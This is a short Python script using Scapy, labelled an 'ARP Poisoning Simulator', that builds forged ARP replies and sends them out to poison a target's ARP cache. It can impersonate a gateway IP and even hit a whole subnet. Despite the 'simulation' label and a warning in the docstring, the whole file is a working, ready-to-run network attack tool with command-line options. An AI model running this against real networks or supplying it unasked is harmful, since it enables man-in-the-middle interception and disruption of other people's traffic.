#!/usr/bin/env python3
"""
Simple ARP Poisoning Simulator
Requires Scapy: pip install scapy
Run with root privileges (sudo)

WARNING: ONLY RUN THIS ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST ON.
"""

import argparse
import time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, get_if_addr, conf

def simulate_poisoning(interface, target_ip, spoof_ip, spoof_mac=None, count=5, interval=1):
    """
    Sends forged ARP replies to poison a target's ARP cache.
    """
    print(f"[*] Starting ARP poisoning simulation on interface: {interface}")
    
    if not spoof_mac:
        try:
            spoof_mac = get_if_hwaddr(interface)
        except Exception as e:
            print(f"[!] Could not determine MAC for {interface}: {e}")
            return

    print(f"[*] Goal: Tell {target_ip} that IP {spoof_ip} is at MAC {spoof_mac}")

    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=spoof_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, hwsrc=spoof_mac)
    
    packet = ether / arp

    print(f"[*] Packet ready. Sending {count} packets with {interval}s interval...\n")

    for i in range(count):
        sendp(packet, iface=interface, verbose=False)
        print(f"[+] Sent forged ARP Reply {i+1}/{count} -> Claiming {spoof_ip} == {spoof_mac}")
        if i < count - 1:
            time.sleep(interval)
            
    print("\n[*] Simulation complete.")

def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Simulator")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to send on (e.g., eth0, wlo1)")
    parser.add_argument("-t", "--target", required=True, help="Target IP to poison (e.g., 192.168.1.100 or 255.255.255.255 for subnet)")
    parser.add_argument("-s", "--spoof", required=True, help="The IP address to spoof (e.g., the Gateway IP 192.168.1.1)")
    parser.add_argument("-m", "--mac", help="The fake MAC address to claim (defaults to your interface's real MAC)")
    parser.add_argument("-c", "--count", type=int, default=3, help="Number of packets to send (default: 3)")
    
    args = parser.parse_args()
    
    simulate_poisoning(
        interface=args.interface,
        target_ip=args.target,
        spoof_ip=args.spoof,
        spoof_mac=args.mac,
        count=args.count
    )

if __name__ == "__main__":
    main()
